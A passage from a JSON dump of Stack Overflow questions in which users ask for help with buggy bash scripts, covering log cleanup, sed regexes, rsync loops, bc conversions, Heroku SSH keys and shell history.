Unix_Array[${counter}]=$line;\n   let counter=counter+1;\ndone &lt; location.txt\n## Reads Email recipients and save it into an array\nnum=0\nwhile read -r line; do\n    Email_list[${num}]=$line;\n    let num=num+1;\ndone &lt; email.txt\n## Checking one file system per loop\nfor ((i=0;i &gt; counter; i++))\n    do\n    deletestatus=false;\n    ## usage returns how much the file system is full. Ex. 50% =&gt; 50\n    usage=$(df -P ${Unix_Array[$i]} | grep ${Unix_Array[$i]} | awk '{ print $5}' | sed 's/%//g')\n    #if usage is greater than 80%, send email\n    if [$usage -gt 80];\n        then\n        for ((j=0;j &gt; num; j++))\n        do\n            echo ${Unix_Array[$i]} \" is \" $usage \"% full, the logs that are 7 days older has been removed\" |  mail - s \"Log notification\" ${Email_list[$j]} \n        done\n        deletestatus=true;\n    elif [$usage -gt 50];\n        then\n        ## if free space is greater 50 and less than 80, it will not send email\n        deletestatus=true;\n    else\n        ## Safety net\n        deletestatus=false;\n    fi\n    if [$deletestatus];\n            then\n        ##Moving Files that are older than 7 days\n        $(find /home/songja/ServerLogs -type f -name 'SystemOut_*' -mtime +2 -exec mv {} /home/songja/test \\;)\n        ## Deleting files that are older than 7 days\n        $(find . $logloc . - name 'SystemOut_*' -mtime +2 -delete)\n     fi\ndone\n</code></pre>\n"},{"tags":["bash","script","stdout"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12642320,"title":"Bash redirect output only to a variable","body":"<p>I have a function:</p>\n\n<pre><code>function getXpath {\n    QUERY=$1\n    XMLPATH=$2\n    XPATH_QUERY=`echo $XPATH_FORMAT | sed -e \"s|{query}|\"$QUERY\"|g\" | sed \"s|{file}|\"$XMLPATH\"|g\"`\n    xpath $XPATH_QUERY\n}   \n</code></pre>\n\n<p>and I want to call it this way:</p>\n\n<blockquote>\n  <p>value=`getXpath \"$2\" \"$XMLPATH\"`</p>\n</blockquote>\n\n<p>value is setted well, the problem is that the result is also being written in the console.</p>\n\n<p>How can I do to only set to the var and not write to the console ?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12640309,"title":"Using CAT in a FIND command","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5810296/bash-find-exec-and-filenames\">bash: find -exec and filenames</a>  </p>\n</blockquote>\n\n\n\n<p>I'm using a find command to find a series of files all with the same name.  I then want to append the contents of a text file to the bottom of each of those files that my find command located.  I thought this would be straightforward enough but I can't seem to get it to work right.  Here is my command:</p>\n\n<pre><code>find . -type f -name 'my_file.php' -exec cat new_include.txt &gt;&gt; {} \\;\n</code></pre>\n\n<p>When I run this using sudo, I get a permission denied error:</p>\n\n<pre><code>-bash: {}: Permission denied\n</code></pre>\n\n<p>If I su into the server and run it as root, I don't get an error but none of the files actually update.  Am I missing something here?  (This is being done on a CentOS 6 server, if that makes a difference.)</p>\n"},{"tags":["linux","bash","pid","rsh"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12639575,"title":"Obtaining PID of Last Command Run on Other Machine","body":"<p>I am using the following code to launch a command on another machine:</p>\n\n<pre><code>#!/bin/bash\n/usr/bin/rsh -n $Host_Name \"cat asdf.txt &amp;\"\n</code></pre>\n\n<p>And I am trying to obtain the PID of the cat command by using the following:</p>\n\n<pre><code>/usr/bin/rsh -n $Host_Name pid=\"$!\"\n</code></pre>\n\n<p>But when I echo $pid, it is just blank. What am I doing incorrectly? Is there an easier way of obtaining the PID of the last command that was executed on a different machine?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","ssh","cygwin","signals"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12639615,"title":"cygwin ssh gives \"Killed by signal 1\" on exit","body":"<p>After using cygwin's ssh to login from windows to linux-hosts, \nwhen exiting the remote shell, I always get the annoying msg:</p>\n\n<p>\"Killed by signal 1\"</p>\n\n<p>I googled, and realize its harmless, but still annoying...\nSome suggested you can get rid of the message by using</p>\n\n<p>$ ssh -q ...</p>\n\n<p>But that has no effect on any of the machines I've tried.</p>\n\n<p>Anyone knows a working solution to get rid of this msg?</p>\n"},{"tags":["linux","bash","unix","sed","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12638753,"title":"sed regex not being greedy?","body":"<p>In bash I have a string variable <code>tempvar</code>, which is created thus:</p>\n\n<pre><code>tempvar=`grep -n 'Mesh Tally' ${meshtalfile}`\n</code></pre>\n\n<p><code>meshtalfile</code> is a (large) input file which contains some header lines and a number of blocks of data lines, each marked by a beginning line which is searched for in the grep above.</p>\n\n<p>In the case at hand, the variable <code>tempvar</code> contains the following string:</p>\n\n<pre><code>5: Mesh Tally Number 4 977236: Mesh Tally Number 14 1954467: Mesh Tally Number 24 4354479: Mesh Tally Number 34\n</code></pre>\n\n<p>I now wish to extract the line number relating to a particularly mesh tally number - so I define a variable meshnum1 as equal to <code>24</code>, and run the following sed command:</p>\n\n<pre><code>echo ${tempvar} | sed -r \"s/^.*([0-9][0-9]*):\\sMesh\\sTally\\sNumber\\s${meshnum1}.*$/\\1/\"\n</code></pre>\n\n<p>This is where things go wrong. I expect the output <code>1954467</code>, but instead I get <code>7</code>. Trying with number <code>34</code> instead returns <code>9</code> instead of <code>4354479</code>. It seems that sed is returning only the last digit of the number - which surely violates the principle of greedy matching? And oddly, when I move the open parenthesis <code>(</code> left a couple of characters to include <code>.*</code>, it returns the whole line up to and including the single character it was previously returning. Surely it cannot be greedy in one situation and antigreedy in another? Hopefully I have just done something stupid with the syntax...</p>\n"},{"tags":["linux","bash","backup","rsync"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12600180,"title":"Loop through directories and rsync contents","body":"<p>I'm looking to rsync only specific files and directories from a cpanel backup to a remote server.</p>\n\n<p>The basic structure is:</p>\n\n<pre><code>/backup/cpbackup/daily/USERNAME\n</code></pre>\n\n<p>from within USERNAME directory I want to backup</p>\n\n<pre><code>../USERNAME/mysql/USERNAME.sql\n</code></pre>\n\n<p>and also a folder (containing files and subfolders)</p>\n\n<pre><code>../USERNAME/homedir/siteassets\n</code></pre>\n\n<p>so I end up on my remote server with:</p>\n\n<pre><code>/USERNAME/mysql/USERNAME.sql\n/USERNAME/homedir/siteassets\n</code></pre>\n\n<p>I could use wildcards </p>\n\n<pre><code>rsync /backup/cpbackup/daily/*/mysql/*.sql  user@remote.ip.address:servername/\n</code></pre>\n\n<p>but this won't give me the USERNAME folder remotely and will mean all the files end up getting merged. I assume this is possible by iterating through folders with bash or something like tht but thats not my strong point</p>\n"},{"tags":["bash","wait","coproc"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12637889,"title":"'wait $COPROC_PID' doesn't wait","body":"<p>The following test script:</p>\n\n<pre><code>#!/bin/bash\nf() { :; }\n\nwhile :; do\n    coproc f par1\n    wait $COPROC_PID\ndone\n</code></pre>\n\n<p>floods the console with:</p>\n\n<pre><code>./debug.sh: line 7: warning: execute_coproc: coproc [8740:COPROC] still exists\n./debug.sh: line 7: warning: execute_coproc: coproc [8741:COPROC] still exists\n</code></pre>\n\n<p>That is, <code>wait</code> doesn't wait for the coprocess to terminate.<br>\nBash version is 4.2.0(5)-release.\nThis does not happen with 4.1.5(1)-release.</p>\n\n<p>Do you think it is a bug?</p>\n"},{"tags":["linux","bash","curl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12637012,"title":"CURL: empty file in bash script","body":"<p>If i run this command in linux command line manually it works, and EDIT.3126026369 is not empty</p>\n\n<pre><code>curl \"http://somesite.com/admin.php?mod=editnews&amp;action=editnews&amp;id=14058\" -s -L -b cookie.ck -c cookie.ck &gt; EDIT.3126026369\n</code></pre>\n\n<p>in bash:</p>\n\n<pre><code>curl \\\"$EDIT\\\" -s -L -b $COOKIE -c $COOKIE &gt; EDIT.$TEMP\n</code></pre>\n\n<p>but in a bash script it generate an empty file. what am missing here?</p>\n"},{"tags":["bash","variables","if-statement","syntax-error","cat"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12636170,"title":"Bash script error with cat and if","body":"<p>I'm learning bash but now I'm having a lot of trouble making this script work: </p>\n\n<pre><code>#!/bin/bash\n\nA=\"0\"\nB=\"0\"\nC=\"0\"\nD=\"0\"\nE=\"0\"\nF=\"0\"\nG=\"0\"\n\nwhile true; do\n\nsleep 1\n\nBATTERY='cat battery.txt'\n\nif [[\"$BATTERY\" -le 100] &amp;&amp; [\"$BATTERY\" -gt 85] &amp;&amp; [$A -eq 0]]; then\n\nA=\"1\"\n    commands... \n\nelif [[\"$BATTERY\" -le 85] &amp;&amp; [\"$BATTERY\" -gt 70] &amp;&amp; [$B -eq 0]]; then\n\nB=\"1\"\n    commands...\n\nelif [[\"$BATTERY\" -le 70] &amp;&amp; [\"$BATTERY\" -gt 55] &amp;&amp; [$C -eq 0]]; then\n\nC=\"1\"\n    commands...\n\nelif [[\"$BATTERY\" -le 55] &amp;&amp; [\"$BATTERY\" -gt 40] &amp;&amp; [$D -eq 0]]; then\n\nD=\"1\"\ncommands...\n\nelif [[\"$BATTERY\" -le 40] &amp;&amp; [\"$BATTERY\" -gt 25] &amp;&amp; [$E -eq 0]]; then\n\nE=\"1\"   \n    commands...\n\nelif [[\"$BATTERY\" -le 25] &amp;&amp; [\"$BATTERY\" -gt 10] &amp;&amp; [$F -eq 0]]; then\n\nF=\"1\"\ncommands...\n\nelif [[\"$BATTERY\" -le 10] &amp;&amp; [\"$BATTERY\" -gt 0] &amp;&amp; [$G -eq 0]]; then\n\nG=\"1\"\ncommands...\nfi\ndone\n</code></pre>\n\n<p>The error that I get when I execute this script is:</p>\n\n<pre><code>./changewill.sh: line 17: [[cat battery.txt: command not found\n./changewill.sh: line 27: [[cat battery.txt: command not found\n./changewill.sh: line 36: [[cat battery.txt: command not found\n./changewill.sh: line 45: [[cat battery.txt: command not found\n./changewill.sh: line 54: [[cat battery.txt: command not found\n./changewill.sh: line 63: [[cat battery.txt: command not found\n./changewill.sh: line 72: [[cat battery.txt: command not found\n</code></pre>\n\n<p>I have been reading and looking around and I think the <code>cat</code> output is correctly assigned to BATTERY. I tried with some different things like <code>{</code> <code>[</code> <code>¨</code>, but nothing works.\nAnd yes, the file exists and it's in the same folder with the script.</p>\n\n<p>Any advice?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":52,"score":3,"question_id":12634503,"title":"How to use XOR in bash","body":"<p>Im trying to XOR two large binary values</p>\n\n<pre><code>echo ${hashArray[1]}\necho ${hashArray[2]}\necho $((${hashArray[1]} ^ ${hashArray[2]}))\n</code></pre>\n\n<p>gives:</p>\n\n<pre><code>10100100000111101011100001101110000110000100001000000111001001100010110000010010111101100110111001111100010010000000010101110111\n\n00001110110000010110101101011011100101101000011100011101001101101010000100110001001110101101111100010001111010100011010000000100\n\n4018181242766406943\n</code></pre>\n\n<p>Why does echo $((${hashArray[1]} ^ ${hashArray[2]})) output a decimal number? Shouldn't it be another large binary value?</p>\n\n<p>Ive tried to look it up in a lot of places but couldn't find a suitable example</p>\n"},{"tags":["linux","bash","find","command"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":67,"score":-2,"question_id":12402511,"title":"How to find bash commands?","body":"<p>I guess it's pretty simple.\nI just want to locate a bash command. For example when I want to know which commands are existing, containing the phrase \"user\".</p>\n\n<p>So the command I am looking for should print me wether the location of all commands containing user, or it could just tell me which commands exist with the name. That would be fine though.</p>\n\n<p>I searched here in so and on google, but well both of them just talk about the \"find\" command.</p>\n"},{"tags":["linux","bash","command-line","filesystems"],"answer_count":5,"favorite_count":7,"up_vote_count":15,"down_vote_count":0,"view_count":8360,"score":15,"question_id":2109056,"title":"How to find duplicate files with same name but in different case that exist in same directory in Linux?","body":"<p>How can I return a list of files that are named duplicates i.e. have same name but in different case that exist in the <em>same directory</em>?</p>\n\n<p>I don't care about the contents of the files. I just need to know the location and name of any files that have a duplicate of the same name.</p>\n\n<p>Example duplicates:</p>\n\n<pre><code>/www/images/taxi.jpg\n/www/images/Taxi.jpg\n</code></pre>\n\n<p>Ideally I need to search all files recursively from a base directory. In above example it was <code>/www/</code></p>\n"},{"tags":["bash","shell","script"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12633394,"title":"Call a local function inside if Statement in bash","body":"<pre><code>#!/bin/bash\n\nif [ -z \"$1\" ]\n  then\n    echo \"No argument supplied\"\n    exit\nfi\n\nif [ \"$1\"=\"abc\" ] ; then\nabc\nexit\nfi\n\nif [ \"$1\" = \"def\" ]; then\ndef\nexit 1\nfi\n\nfunction abc()\n{\n    echo \"hello\"\n}\n\nfunction def()\n{\n    echo \"hi\"\n}\n</code></pre>\n\n<p>Here abc is a function which has local definition. But Bash is giving error \"./xyz.sh: line 10: abc: command not found\". Please give me any Solution?</p>\n"},{"tags":["php","bash","heroku"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12635447,"title":"Heroku PHP : running an executable on bash : no such file or directory","body":"<p>I am trying to run a PHP application on Heroku. </p>\n\n<p>I have a file which is set to executable via chmod, however when I call that file via bash I get <code>No such file or directory</code>.</p>\n\n<p>I tried to do an <code>ld</code> command for it and it says it is <code>not a dynamic executable</code>. </p>\n\n<p>I searched and found the solution is to install <code>ia32-libs</code> but I dont know if I am allowed to install that on Heroku ( I could't do that via <code>apt-get</code> ) </p>\n\n<p>Please explain what could probably be the issue. Any help would be appreciated.</p>\n\n<p>Thanks.</p>\n"},{"tags":["regex","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":325,"score":1,"question_id":9191030,"title":"Removing pattern at the end of a string using sed or other bash tools","body":"<p>I would like to remove any ABC at the end of the string. </p>\n\n<p>The best I have came up with is </p>\n\n<pre><code>echo ${String}| sed -e 's/[\"ABC\"]*$//g'\n</code></pre>\n\n<p>However, it will remove all the A, or B or C at the end of the string. </p>\n\n<p>If String is DAAAAABCBBBCCABCABC, if I use the above expression, it will return \"D\", instead of \"DAAAAABCBBBCC\"</p>\n\n<p>Is there any better way of doing this? Thanks. </p>\n"},{"tags":["linux","bash","ubuntu","rvm"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12634932,"title":"Unable to load the bashrc and bash_profile","body":"<p>I am running couple ec2 ubuntu 10.04 instances on AWS. The am trying to config AWS command line tools to configure auto scaling. I have added the path's and env_variables in the bashrc script. So its should load all the variable once run source ~/.bashrc. But I was not happening, so added bash_profile and added source ~/.bashrc in the bash_profile file. Though it was quite helpful for me and it was loading bashrc, but it actually ruined my rvm source. How do I fix it. \nI did to run both rvm and also all the custom env variables also. Kindly help me to get this done.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12633522,"title":"Prevent bc from auto truncating leading zeros when converting from hex to binary","body":"<p>I'm trying to convert a hex string to binary. I'm using:</p>\n\n<pre><code>echo \"ibase=16; obase=2; $line\" | BC_LINE_LENGTH=9999 bc\n</code></pre>\n\n<p>It is truncating the leading zeroes. That is, if the hex string is <code>4F</code>, it is converted to <code>1001111</code> and if it is <code>0F</code>, it is converted to <code>1111</code>. I need it to be <code>01001111</code> and <code>00001111</code></p>\n\n<p>What can I do?</p>\n"},{"tags":["bash","bc"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12633199,"title":"A large hex to binary conversion in bc","body":"<p>I'm trying to convert a 32 character long hex string (eg: <code>A41EB86E184207262C12F66E7C480577</code>) to binary. I'm using:</p>\n\n<pre><code>echo \"ibase=16; obase=2; $line\" | bc\n</code></pre>\n\n<p>but its including an unnecessary <code>\\</code> in-between which is not letting me perform any bit operations on the result.</p>\n\n<p>An example output that I got is:</p>\n\n<pre><code>10100100000111101011100001101110000110000100001000000111001001100010\\\n110000010010111101100110111001111100010010000000010101110111\n</code></pre>\n\n<p>Notice the <code>\\</code> in the end of the first line.</p>\n\n<p>What can I do to avoid it?</p>\n"},{"tags":["ruby","bash","heroku","ssh"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":51,"score":3,"question_id":12632642,"title":"Heroku Dep Issue: SSH, PubKey Failure (Errno::EISDIR)","body":"<p>I'm currently working through Hartl's tutorial, struggling to deploy to heroku. Running OSX 10.8.1.</p>\n\n<p>Experienced ssh issues and read thru <em>three-dozen questions</em> here, but can't figure it out.\nI've added two additional ssh id's but it gives me the following error for id's 2 and 3.</p>\n\n<pre><code>$ heroku login\nEnter your Heroku credentials.\nEmail: email@gmail.com  \nPassword (typing will be hidden): \nFound the following SSH public keys:\n1) github_rsa.pub\n2) id_dsa.pub\n3) id_rsa.pub\n\nWhich would you like to use with your Heroku account? 3\nUploading SSH public key /Users/admin/.ssh/id_rsa.pub... failed\n !    Heroku client internal error.\n !    Search for help at: https://help.heroku.com\n !    Or report a bug at: https://github.com/heroku/heroku/issues/new\n\n    Error:       Is a directory - /Users/admin/.ssh/id_rsa.pub (Errno::EISDIR)\n    Backtrace:   \n\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/auth.rb:290:in `read'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/auth.rb:290:in `block in associate_key'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/helpers.rb:236:in `action'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/auth.rb:288:in `associate_key'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/auth.rb:269:in `associate_or_generate_ssh_key'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/auth.rb:239:in `check_for_associated_ssh_key'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/auth.rb:233:in `ask_for_and_save_credentials'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/auth.rb:84:in `get_credentials'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/auth.rb:41:in `login'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/command/auth.rb:31:in `login'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/command.rb:206:in `run'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/lib/heroku/cli.rb:28:in `start'\n  /Users/admin/.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/heroku-2.32.4/bin/heroku:16:in `&lt;top (required)&gt;'\n  /Users/admin/.rbenv/versions/1.9.3-p194/bin/heroku:23:in `load'\n  /Users/admin/.rbenv/versions/1.9.3-p194/bin/heroku:23:in `&lt;main&gt;'\n\n    Command:     heroku login\n    Version:     heroku-toolbelt/2.32.4 (x86_64-darwin12.1.0) ruby/1.9.3 autoupdate\n</code></pre>\n\n<p>When I do get the id to load/authorize, I attempt to <code>git push heroku master</code> yet I'm met with:</p>\n\n<pre><code>Permission denied (publickey).\nfatal: The remote end hung up unexpectedly\n</code></pre>\n\n<p>Could the issue perhaps be that I need to replace #1 with #3 (delete all but the #3 id?)</p>\n\n<p>Would love your help!</p>\n"},{"tags":["linux","bash","shell","fonts","zsh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12627626,"title":"Bash has colors, bold and underlined characters. Why not Italic?","body":"<p>I am naming bash, but the question applies to other linux shells as well.\nIs there a reason why italic characters have not been included?</p>\n"},{"tags":["linux","bash","debian","raspberry-pi","raspbian"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":160,"score":0,"question_id":12632224,"title":"Command not found in Raspbian /etc/profile script","body":"<p>I have modified my <code>/etc/profile</code> script at the end to automatically load <code>rvmsudo siriproxy server</code>, however I get some strange errors:</p>\n\n<p><strong>/etc/profile</strong></p>\n\n<pre><code># /etc/profile: system-wide .profile file for the Bourne shell (sh(1))\n# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).\n\nif [ \"`id -u`\" -eq 0 ]; then\n  PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/pi/.rvm/bin:/home/pi/.rvm/gems/ruby-1.9.3-p194@SiriProxy/bin\"\nelse\n  PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/pi/.rvm/bin:/home/pi/.rvm/gems/ruby-1.9.3-p194@SiriProxy/bin\"\nfi\nexport PATH\n\nif [ \"$PS1\" ]; then\n  if [ \"$BASH\" ] &amp;&amp; [ \"$BASH\" != \"/bin/sh\" ]; then\n    # The file bash.bashrc already sets the default PS1.\n    # PS1='\\h:\\w\\$ '\n    if [ -f /etc/bash.bashrc ]; then\n      . /etc/bash.bashrc\n    fi\n  else\n    if [ \"`id -u`\" -eq 0 ]; then\n      PS1='# '\n    else\n      PS1='$ '\n    fi\n  fi\nfi\n\n# The default umask is now handled by pam_umask.\n# See pam_umask(8) and /etc/login.defs.\n\nif [ -d /etc/profile.d ]; then\n  for i in /etc/profile.d/*.sh; do\n    if [ -r $i ]; then\n      . $i\n    fi\n  done\n  unset i\nfi\n\nalias ls='ls --color'\ncd ~/SiriProxy\nrvmsudo siriproxy server\n</code></pre>\n\n<p>The first two lines work where I'm setting the <code>ls</code> color alias and the directory change. The problem is the following:</p>\n\n<pre><code>Last login: Fri Sep 28 11:42:44 2012 from 192.168.10.94\n/usr/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require': cannot load such file -- bundler (LoadError)\n        from /usr/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require'\n        from /home/pi/SiriProxy/lib/siriproxy/command_line.rb:177:in `load_code'\n        from /home/pi/SiriProxy/lib/siriproxy/command_line.rb:84:in `run_server'\n        from /home/pi/SiriProxy/lib/siriproxy/command_line.rb:37:in `initialize'\n        from bin/siriproxy:6:in `new'\n        from bin/siriproxy:6:in `&lt;main&gt;'\npi@raspberrypi:~/SiriProxy$\n</code></pre>\n\n<p>What it's meant to do is the following:</p>\n\n<pre><code>pi@raspberrypi:~/SiriProxy$ rvmsudo siriproxy server\nStarting SiriProxy on port 443..\n</code></pre>\n"},{"tags":["bash","shell","unix","recursion"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12631275,"title":"Removing directory recursively without using rm command","body":"<p>Hi I am trying to remove/delete a directory along with its sub directories and files recursively. I don't want to use rm -r. I have come up with the following code.   </p>\n\n<pre><code> function recursive(){\n            for i in \"$1\"/*; do\n\n                    if [ -d $i ];then\n                            echo \"FILE $i IS A DIRECTORY\"\n                            if [ \"$(ls -A $i)\" ];then\n                                    echo \"DIRECTORY IS NOT EMPTY CALLING RECURSIVE AGAIN\"\n                                    recursive $i\n                            else\n                                    echo \"DELETE THIS DIRECTORY: ITS EMPTY\"\n                            fi\n                    elif [ -e $i ];then\n                            echo \"DELETING FILE $i\"\n                    else\n                            echo UNKNOWN FILE $(basename $i)\n                    fi\n            done\n\n    }\n</code></pre>\n\n<p>The problem is as I dig deep into sub directories, I can delete their files on the way, but once I reach the bottom of directory tree, I have to delete all the directories which are now empty (maybe on my way back up?)</p>\n\n<p>Would really appreciate if someone could help me with its logic or guide me in the right direction.</p>\n\n<p>The answer to <a href=\"http://stackoverflow.com/questions/7977501/recursively-remove-a-directory-using-c\">THIS</a> question makes sense but I don't know how can it handle if there are few levels of sub directories ? </p>\n"},{"tags":["osx","bash","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12627776,"title":"Handling a list of files and directories with spaces in an array","body":"<p>How do I best handle a mix of files and directories in an array. I need to create an array of files and folders and loop through the array and subject each item in the array to the rm command with the -rf options: </p>\n\n<pre><code>#Build array of files to be deleted\n\nFILES=(\n\"~/Library/Preferences/Adobe InDesign\"\n\"~/Library/Caches/Adobe InDesign\"\n\"~/Library/Saved Application State/com.adobe.InDesign.savedstate\"\n)\n\n\n#Loop through array deleting each file/directory with the recursive force options\n\n    for i in \"${FILES[@]}\"\n\n      do\n\n        rm -rf \"$i\"\n\n      done\n\n    exit\n</code></pre>\n"},{"tags":["bash","if-statement","background-process"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12630325,"title":"Bash: Can't launch background process inside IF-THEN-ELSE-FI","body":"<p>I am trying to create a simple bash script that will launch an app from the command line and redirect STDOUT and STDERR output to /dev/null. I also want to include functionality that provides feedback if the script fails. </p>\n\n<p>The script almost works, but I can't get apps to launch in the background. I have tried using nohup, disown, wrapping the if statement in \"(if...fi)&amp;\", wrapping the else statement in \"{... ;}&amp;\", but everything I've tried has either introduced new problems or not worked at all. </p>\n\n<p>Any suggestions? </p>\n\n<p>Here is a basic version of what I'm doing:</p>\n\n<pre><code>#!/bin/bash\nread -p \"Enter program name: \" APP\nif \n  $APP 2&gt;&amp;1 | grep -q \"command not found\"\nthen\n  echo \"That didn't work.\"\nelse\n  $APP &gt;/dev/null 2&gt;&amp;1 &amp;  \nfi\n</code></pre>\n"},{"tags":["c","bash"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":154,"score":4,"question_id":11966030,"title":"How can I programmatically access the bash command history in C?","body":"<p>I hate the bash 'history' command. It never finds the history items I want. Sometimes I can get what I want with 'history | grep XXX' but often either the history is too long (400+ hits! yay) or too short (no hits. Boo).</p>\n\n<p>I thought to myself, why dont I write a little 'history helper' command that lets me basically 'star' specific history items and make them <em>always</em> turn up in my history, with both a global star list and a cwd specific star list.</p>\n\n<p>Sounds amazing. So I naively tried to read the history by doing this:</p>\n\n<pre><code>system(\"history &gt; blah\")\nFILE *fp = fopen(\"blah\", \"r\")\n</code></pre>\n\n<p>Oh, that didn't work. Ah, I get it, the system() command runs in it's own context and can't access the bash history. Drats. Ok, so I'll try reading <strong>~/.bash_history</strong></p>\n\n<p>ba baaa~ Nope. That's only got the history up until the last call to either a) history -w, or b) call to exit from the shell.</p>\n\n<p>So, question: <strong>How can I programatically access the current bash history in C?</strong></p>\n\n<p>(NB. No, <em>not</em> what's in ~/.bash_history, the <em>current</em> history, the exact output you see when you type 'history' from the prompt; also, why C you ask? why not...but really, because I already have a handy ncurses wrapper I was going to use to let me get fancy auto-completion and sub-selection history searching on normal terminals...) </p>\n\n<p>Edit: Please, if you have something useful to contribute, I'm happy to hear it, but I get a little sick of comments like 'you should read the bash history man pages'.</p>\n\n<p>I have read them. There is <em>nothing</em> that allows me to 'star' a history item and have it always turn up in my history, and <strong>nothing</strong> that allows me to maintain a per-directory history context. These are things that history does not support. I appreciate this. That's why I want to write a helper function, for my specific purpose. If you have a comment like \"maybe you should read the history man pages some more\", please just hold it in, and don't respond; it doesn't really address my question. :)</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12628327,"title":"How to show and update echo on same line","body":"<p>I have the following in Bash (In Linux)</p>\n\n<pre><code>for dir in Movies/*\ndo\n  (cd \"$dir\" &amp;&amp; pwd|cut -d \\/ -f5|tr -s '\\n' ', ' &gt;&gt; ../../movielist &amp;&amp;\n  exiftool * -t -s3 -ImageSize -FileType|tr -s '\\t' ',' &gt;&gt; ../../movielist )\necho \"Movie $movies - $dir ADDED!\"\nlet movies=movies+1\ndone\n</code></pre>\n\n<p>But I wish to make it so the \"echo\" shows the following echo on the next line (Not concatenate with the last echo output but replace it) so to make it look like it is updating. Similar to how a progress bar with percent would show on the same line.</p>\n"},{"tags":["bash","shell","aix"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12628200,"title":"Error with saving text line into array","body":"<p>I'm trying to extract directory location from location.txt and save it into an array, but it's not looking good. When I execute the script,</p>\n\n<p>i get this error</p>\n\n<pre><code>  ./test.sh: line 7: location.txt: No such file or directory bina@ajax $ ./test.sh\n  ./test.sh: line 5: =/apps/IBM: No such file or directory\n  ./test.sh: line 5: =/usr/home: No such file or directory\n  ./test.sh: line 11: Unix_Array[0]: command not found\n\n  ./test.sh: line 11: Unix_Array[1]: command not found\n</code></pre>\n\n<p>Here is my code</p>\n\n<pre><code>   #!/bin/sh\n\n   counter=0\n   while read -r line; do\n       ${Unix_Array[${counter}]}=$line;\n       let counter=counter+1;\n   done &lt; location.txt\n\n   for ((i=0 ;counter &gt; i; i++))\n   do\n       echo $(Unix_Array[$i])\n 